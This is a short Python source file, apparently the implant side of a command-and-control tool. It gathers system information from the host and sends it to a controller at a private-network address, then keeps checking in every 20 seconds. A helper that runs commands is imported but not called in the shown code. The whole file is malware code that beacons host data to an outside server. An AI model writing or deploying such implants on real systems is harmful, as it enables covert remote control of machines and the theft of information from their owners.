from functions.c2_functions import get_sysinfo, first_checkin, run_command, persistent_checkin

SERVER_URL = "http://192.168.91.10:5000/checkin"

def c2():
    sysinfo = get_sysinfo()
    print(f"info before sending: {sysinfo}")
    if first_checkin(SERVER_URL, sysinfo):
        print("Connected")
        persistent_checkin(SERVER_URL, sysinfo, 20)
    else:
        print("Error")
    # first_response = first_checkin(SERVER_URL, sysinfo)

    # if not first_response:
    #     print("Failed?")
    #     return
    
if __name__ == "__main__":
    c2()